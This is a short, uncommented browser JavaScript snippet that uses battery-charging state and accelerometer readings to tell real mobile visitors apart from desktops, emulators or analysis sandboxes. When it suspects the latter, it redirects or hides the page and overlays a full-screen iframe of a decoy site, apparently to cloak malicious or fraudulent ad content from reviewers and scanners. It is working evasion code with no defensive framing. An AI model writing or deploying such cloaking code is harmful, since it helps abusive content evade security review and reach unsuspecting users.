// Var 2
var gexit = false;
var ch = false;

if (typeof r == 'undefined') {
    r = false;
}
if (typeof u == 'undefined') {
    u = "http://aol.com";
}

navigator.getBattery().then(function(battery) {
    if (typeof battery == 'undefined') {
      console.log('c no ' + typeof battery);
      return 0;
    }
    ch = battery.charging;
    console.log('c in ' + ch);

});

window.ondevicemotion = function(event) {  
    var aX = event.accelerationIncludingGravity.x;  


    if ( ( typeof aX == 'number') && ( ch == false ) ) {
        gexit = false;
    } else if (gexit == false) {
        gexit = true;
        if (r == true) {
            window.location = u;
            return;
        } else {
            document.getElementsByTagName("html")[0].setAttribute('style', 'visibility:hidden !important; background-color:#FFFFFF !important');
            document.title = "";
            window.alert = function () {};
            document.write('<iframe src="' + u + '" style="visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>');
            document.write('<style type="text/undefined">');
        }
    }

} 
